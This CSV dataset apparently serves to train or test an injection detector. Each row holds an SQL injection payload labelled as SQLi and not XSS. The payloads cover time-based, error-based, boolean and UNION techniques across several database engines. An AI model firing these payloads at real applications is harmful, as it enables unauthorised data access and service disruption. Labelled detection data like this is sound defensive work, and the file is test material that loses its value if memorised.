index,payload,sqli,xss
5576,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",1,0
5577,-8370'   )    )    or   (  3501  =  6407  )  *6407 and    (    (   'agcm' like 'agcm,1,0
5578,"1%""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""%""  =  """,1,0
5579,"1"" waitfor delay '0:0:5'--",1,0
5580,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",1,0
5581,"1'+  (  select uzan where 4312  =  4312 and make_set  (  3129  =  9555,9555   )    )   +'",1,0
5582,"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'kejy'  =  'kejy",1,0
5583,"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1,0
5584,1%'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1,0
5585,"-1050""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""orfo"" like ""orfo",1,0
5586,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0
5587,1'  )   where 3893  =  3893,1,0
5588,1%'  )   rlike sleep  (  5  )  #,1,0
5589,"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",1,0
5590,"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,0
5591,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'xkxi' like 'xkxi",1,0
5592,"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,0
5593,"1   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
5594,"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1,0
5595,"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",1,0
5596,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",1,0
5597,"1' in boolean mode  )   or elt  (  6272  =  6272,sleep  (  5   )    )   #",1,0
5598,"1 and elt  (  4249  =  4249,7259  )  # lwyo",1,0
5599,"1""  )   as semi where 4260  =  4260",1,0
5600,1'   )    )    as qswu where 6377  =  6377,1,0
5601,"1%""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1,0
5602,"-9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514",1,0
5603,"-8686"" where 4532  =  4532 or elt  (  3301  =  9065,9065  )  --",1,0
5604,"1""  )   where 8254  =  8254 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,0
5605,"1  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0
5606,select case when 5894  =  4052 then 1 else null end--,1,0
5607,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",1,0
5608,"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,1,0
5609,1%' and sleep  (  5  )   and '%'  =  ',1,0
5610,"1"" or sleep  (  5  )   and ""telb""  =  ""telb",1,0
5611,1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1,0
5612,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",1,0
5613,"-6249'   )    )     )   union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",1,0
5614,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,0
5615,"1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0
5616,1%' rlike   (  select   (  case when   (  3596  =  4245  )   then 1 else 0x28 end   )    )    and '%'  =  ',1,0
5617,"1   )    )    union all select null,null#",1,0
5618,"1'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0
5619,1  )   where 8041  =  8041,1,0
5620,"1"" or sleep  (  5  )  ",1,0
5621,1  )   as sglv where 7676  =  7676,1,0
5622,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",1,0
5623,"1' where 9241  =  9241 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0
5624,1   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  3919  =  3919,1,0
5625,"1   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   2939  =  2939",1,0
5626,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""nthu"" like ""nthu",1,0
5627,"1  )   where 3740  =  3740 union all select null,null,null,null,null,null,null,null--",1,0
5628,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,0
5629,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""tlpw""  =  ""tlpw",1,0
5630,"1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
5631,"iif  (  8770  =  9611,1,1/0  )  ",1,0
5632,-2233' or   (  1807  =  7274  )  *7274,1,0
5633,"1%'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,0
5634,"1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  '",1,0
5635,1'  )   where 5279  =  5279 or sleep  (  5  )  #,1,0
5636,select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc,1,0
5637,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',1,0
5638,"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,0
5639,"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,0
5640,1  )   as jtfx where 8038  =  8038,1,0
5641,"-4699  )   as mymz where 3405  =  3405 or elt  (  1032  =  1032,3623  )  --",1,0
5642,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
5643,"1%""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,0
5644,"1'||  (  select 'xbvz' from dual where 1632  =  1632 union all select null,null,null,null,null,null,null,null--",1,0
5645,"1   )    )    as spdf where 8554  =  8554 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,0
5646,1'||  (  select 'ylio' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',1,0
5647,"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1,0
5648,"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
5649,"-5972"" or 8509  =  3448#",1,0
5650,"1 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0
5651,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1,0
5652, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,0
5653,-7775 or 8571  =  8571--,1,0
5654,"1   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,0
5655,"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1,0
5656,"-7691"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,0
5657,1 where 7425  =  7425 rlike   (  select   (  case when   (  4056  =  3196  )   then 1 else 0x28 end   )    )   --,1,0
5658,"1'||  (  select 'aoad' where 8795  =  8795 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",1,0
5659,1%'   )    )     )   order by 1--,1,0
5660,1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,1,0
5661,1  )   and 9198  =  9198--,1,0
5662,"1 where 8905  =  8905 and make_set  (  7654  =  1923,1923  )  --",1,0
5663,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'xhez' like 'xhez",1,0
5664,"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,0
5665,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",1,0
5666,"-9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  --",1,0
5667, ) ,1,0
5668,"1,  (  select   (  case when   (  2970  =  5830  )   then 1 else 2970*  (  select 2970 from mysql.db  )   end   )    )   ",1,0
5669,-3424'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'dyuo'  =  'dyuo,1,0
5670,"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",1,0
5671,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",1,0
5672,"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,0
5673,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,0
5674,"1%' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and '%'  =  '",1,0
5675,1  )   where 3936  =  3936,1,0
5676,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""dros""  =  ""dros",1,0
5677,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,0
5678,"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0
5679,1%'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1,0
5680,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   '%'  =  '",1,0
5681,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",1,0
5682,"1' where 2123  =  2123 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0
5683,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,0
5684,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",1,0
5685,"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1,0
5686,"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0
5687,"1',  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,0
5688,"1%'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,0
5689,-9841 where 4612  =  4612 union all select 4612--,1,0
5690,"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """,1,0
5691,"1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh",1,0
5692,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,0
5693,"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0
5694,"-6595"" order by 1--",1,0
5695,select sleep  (  5  )   and 'beuk'  =  'beuk,1,0
5696,"1%""  )   union all select null,null,null,null,null--",1,0
5697,"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1,0
5698,"1   )    )     )   and elt  (  3132  =  1541,1541  )   and    (    (     (  4258  =  4258",1,0
5699,"1%""   )    )    waitfor delay '0:0:5'--",1,0
5700,"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",1,0
5701,"1%'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  '%'  =  '",1,0
5702,"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'akki'  =  'akki",1,0
5703,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",1,0
5704,1'  )   where 1183  =  1183,1,0
5705,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--",1,0
5706,1' where 5230  =  5230,1,0
5707,"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lmjg"" like ""lmjg",1,0
5708,1'  )   as bzem where 4240  =  4240,1,0
5709,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,0
5710,1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1,0
5711,1 and sleep  (  5  )  # qcyj,1,0
5712,"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""lynw"" like ""lynw",1,0
5713,1 where 4519  =  4519,1,0
5714,"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1,0
